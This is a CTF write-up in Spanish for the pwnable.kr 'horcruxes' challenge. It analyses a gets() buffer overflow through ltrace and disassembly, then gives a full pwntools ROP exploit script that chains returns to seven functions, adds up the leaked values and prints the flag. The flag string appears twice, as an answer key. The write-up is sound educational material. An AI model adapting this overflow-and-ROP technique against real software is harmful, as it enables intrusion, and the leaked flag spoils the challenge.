# horcruxes

![horcruxes](https://github.com/user-attachments/assets/d2be3452-5d56-4ea1-ace5-4c7d59fd5410)

El binario genera 7 numeros aleatorios (los horcruxes):
```
horcruxes@ubuntu:~$ ltrace ./horcruxes
__libc_start_main(0x80413fb, 1, 0xffc6d844, 0 <unfinished ...>
setvbuf(0xf7ebbda0, 0, 2, 0)             = 0
setvbuf(0xf7ebb620, 0, 2, 0)             = 0
alarm(60)                                = 0
puts("Voldemort concealed his splitted"...Voldemort concealed his splitted soul inside 7 horcruxes.
) = 58
puts("Find all horcruxes, and destroy "...Find all horcruxes, and destroy it!

) = 37
open("/dev/urandom", 0, 037761553530)    = 3
read(3, "\243\027tD", 4)                 = 4
close(3)                                 = 0
srand(0x447417a3, 0xffc6d748, 4, 0x80416a4) = 1
rand(0x8042220, 0xfbad008b, 0x447417a3, 3) = 0x57054550
rand(0x8042220, 0xfbad008b, 0x447417a3, 3) = 0x61c60cc8
rand(0x8042220, 0xfbad008b, 0x447417a3, 3) = 0x110043e6
rand(0x8042220, 0xfbad008b, 0x447417a3, 3) = 0xd84e529
rand(0x8042220, 0xfbad008b, 0x447417a3, 3) = 0x39a515df
rand(0x8042220, 0xfbad008b, 0x447417a3, 3) = 0x6e6ab3da
rand(0x8042220, 0xfbad008b, 0x447417a3, 3) = 0x4cf115e5
```

En la funcion `ropme` el primer valor que introducimos se compara con cada horcrux y salta a alguna de las funciones `A`,`B`,`C`,`D`,`E`,`F`,`G` (que imprimen los horcruxes) si conciden, se ve en lineas como:
```
   0x08041555 <+74>:	jne    0x8041561 <ropme+86>
   0x08041557 <+76>:	call   0x804129d <A>
   0x0804155c <+81>:	jmp    0x804168e <ropme+387>
   0x08041561 <+86>:	mov    edx,DWORD PTR [ebp-0x10]
   0x08041564 <+89>:	mov    eax,DWORD PTR [ebx+0x80]
   0x0804156a <+95>:	cmp    edx,eax
   0x0804156c <+97>:	jne    0x8041578 <ropme+109>
   0x0804156e <+99>:	call   0x80412cf <B>
   0x08041573 <+104>:	jmp    0x804168e <ropme+387>
```

Al final si no coincide con ninguno entonces se reservan 0x74 bytes y nos piden introducir cuanta experiencia ganamos (la suma de los horcruxes). Convierte la entrada a un entero con `atoi` y si es correcto entonces abre el archivo `flag` e imprime su contenido:
```
 0x08041600 <+245>:	lea    eax,[ebp-0x74]
   0x08041603 <+248>:	push   eax
   0x08041604 <+249>:	call   0x8041080 <gets@plt>
   0x08041609 <+254>:	add    esp,0x10
   0x0804160c <+257>:	sub    esp,0xc
   0x0804160f <+260>:	lea    eax,[ebp-0x74]
   0x08041612 <+263>:	push   eax
   0x08041613 <+264>:	call   0x8041140 <atoi@plt>
   0x08041618 <+269>:	add    esp,0x10
   0x0804161b <+272>:	mov    edx,DWORD PTR [ebx+0x98]
   0x08041621 <+278>:	cmp    eax,edx
   0x08041623 <+280>:	jne    0x804167c <ropme+369>
   0x08041625 <+282>:	sub    esp,0x8
   0x08041628 <+285>:	push   0x0
   0x0804162a <+287>:	lea    eax,[ebx-0x1e1c]
   0x08041630 <+293>:	push   eax
   0x08041631 <+294>:	call   0x80410f0 <open@plt>
   0x08041636 <+299>:	add    esp,0x10
   0x08041639 <+302>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804163c <+305>:	sub    esp,0x4
   0x0804163f <+308>:	push   0x64
   0x08041641 <+310>:	lea    eax,[ebp-0x74]
   0x08041644 <+313>:	push   eax
   0x08041645 <+314>:	push   DWORD PTR [ebp-0xc]
   0x08041648 <+317>:	call   0x8041060 <read@plt>
   0x0804164d <+322>:	add    esp,0x10
   0x08041650 <+325>:	mov    BYTE PTR [ebp+eax*1-0x74],0x0
   0x08041655 <+330>:	sub    esp,0xc
   0x08041658 <+333>:	lea    eax,[ebp-0x74]
   0x0804165b <+336>:	push   eax
   0x0804165c <+337>:	call   0x80410d0 <puts@plt>
   0x08041661 <+342>:	add    esp,0x10
   0x08041664 <+345>:	sub    esp,0xc
   0x08041667 <+348>:	push   DWORD PTR [ebp-0xc]
   0x0804166a <+351>:	call   0x8041150 <close@plt>
   0x0804166f <+356>:	add    esp,0x10
   0x08041672 <+359>:	sub    esp,0xc
   0x08041675 <+362>:	push   0x0
   0x08041677 <+364>:	call   0x80410e0 <exit@plt>
   0x0804167c <+369>:	sub    esp,0xc
   0x0804167f <+372>:	lea    eax,[ebx-0x1e00]
   0x08041685 <+378>:	push   eax
   0x08041686 <+379>:	call   0x80410d0 <puts@plt>
   0x0804168b <+384>:	add    esp,0x10
   0x0804168e <+387>:	mov    eax,0x0
   0x08041693 <+392>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08041696 <+395>:	leave
   0x08041697 <+396>:	ret
``` 

Por si las dudas, la generacion y suma de los horcruxes se calcula en la funcion `init_ABCDEFG`.

Bueno resulta que la funcion `gets` que toma nuestra entrada es vulnerable, no revisa limites del arreglo y hay un buffer overflow. De paso sabemos que el binario no tiene canary (el buffer overflow pasa desapercibido) y no tiene PIE(las direcciones de memoria no cambian):
```
horcruxes@ubuntu:~$ checksec --file=horcruxes
[!] Could not populate PLT: [Errno 12] Cannot allocate memory
[*] '/home/horcruxes/horcruxes'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8040000)
    Stripped:   No
```

Debemos hacer ROP (Return Oriented Programming) para retornar a cada una de las funciones que imprimen la experiencia de los horcruxes, tomar su salida y sumarla y entonces volver a `ropme` a escribir la suma de la experiencia obtenida:

Se reservan 0x74 bytes asi que el offset es 0x74 + 4 bytes del `ebp` guardado en la funcion.

``` python
from pwn import *

sh =  connection = ssh('horcruxes','pwnable.kr',password='guest',port=2222)
io = sh.process(["nc","0.0.0.0","9032"])

A = 0x0804129d
B = 0x080412cf
C = 0x08041301
D = 0x08041333
E = 0x08041365
F = 0x08041397
G = 0x080413c9
ropme = 0x0804150b
payload = flat (
            cyclic(0x74),
            cyclic(0x4),
            p32(A),
            p32(B),
            p32(C),
            p32(D),
            p32(E),
            p32(F),
            p32(G),
            p32(ropme),
          )

io.sendline(b"1")
io.sendline(payload)

io.recvuntil(b"Voldemort\n")
sum = 0
for _ in range(7):
    exp = int(io.recvline().decode().strip().split("+")[1][:-1])
    sum += exp

io.recv()
io.sendline(b"1")
io.sendline(str(sum))
io.interactive()
```

```
[+] Connecting to pwnable.kr on port 2222: Done
[*] asm@pwnable.kr:
    Distro    Ubuntu 22.04
    OS:       linux
    Arch:     amd64
    Version:  5.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on pwnable.kr: pid 518538
[!] ASLR is disabled for '/usr/bin/nc.openbsd'!
/home/kalcast/s.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(str(sum))
[*] Switching to interactive mode
How many EXP did you earned? : The_M4gic_sp3l1_is_Avada_Ked4vra
```

**Nota**: No sabia que hacia la instruccion `__x86.get_pc_thunk.bx` pero luego me di cuenta que carga la direccion del codigo en el registro `ebx` para acceder a objetos y variables globales por medio de un desplazamiento de ese registro.

**Otra nota**: Recordar que la arquitectura trabajada en este programa es `x86` a veces llamada `i386`, por lo que los parametros a funciones se llaman mediante `pop/push` usando la pila y NO registros. 

`The_M4gic_sp3l1_is_Avada_Ked4vra`
